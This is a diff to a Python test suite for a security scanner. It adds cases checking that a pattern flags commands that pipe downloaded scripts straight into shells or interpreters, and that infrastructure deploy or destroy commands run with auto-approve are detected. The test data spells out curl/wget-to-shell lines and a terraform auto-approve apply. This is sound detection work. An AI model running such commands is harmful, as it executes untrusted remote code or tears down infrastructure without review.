@@ -572,6 +572,30 @@ class TestRemoteScriptExecNegatives:
         assert remote_script_exec.scan(text) == []
 
 
+class TestSimplePipeToShell:
+    """The lightweight command-scoped matcher shared by drone DR-014 and
+    harness HARNESS-005. Broader interpreter set than a bare sh/bash so
+    ``| python`` and ``| sudo bash`` don't slip through, but URL-agnostic
+    (a piped ``$URL`` variable still fires) and keeps the BSD ``fetch``."""
+
+    @pytest.mark.parametrize("cmd", [
+        "curl -fsSL https://e.x/i.sh | sh",
+        "wget -qO- https://e.x/i.sh | bash",
+        "curl $URL | python3",
+        "curl https://e.x/i | sudo bash",
+        "fetch https://e.x/i.pl | perl",
+    ])
+    def test_pipe_to_interpreter_matches(self, cmd):
+        assert remote_script_exec.SIMPLE_PIPE_TO_SHELL_RE.search(cmd)
+
+    @pytest.mark.parametrize("cmd", [
+        "curl -fsSL https://e.x/x.tar.gz -o x.tar.gz",  # download only
+        "curl https://e.x/x | tee /tmp/x.log",          # non-interpreter
+    ])
+    def test_non_interpreter_not_matched(self, cmd):
+        assert not remote_script_exec.SIMPLE_PIPE_TO_SHELL_RE.search(cmd)
+
+
 class TestRemoteScriptExecReDoS:
     """A crafted long line must not drive the patterns into quadratic
     backtracking. Each fill is length-capped (``_MAX_FILL``); before the
@@ -859,6 +883,12 @@ class TestDeployNames:
         "pulumi up --yes",
         "pulumi destroy",
         "sam deploy",
+        # ``-chdir=DIR`` (the standard CI way to target a non-root module)
+        # sits between the tool name and the subcommand; it must not break
+        # the match, or all five IaC-apply-on-untrusted-trigger rules bypass.
+        "terraform -chdir=infra apply -auto-approve",
+        "tofu -chdir=./env/prod destroy",
+        "terragrunt -chdir=stacks run-all apply",
     ])
     def test_iac_apply_matches(self, cmd):
         assert deploy_names.IAC_APPLY_RE.search(cmd) is not None
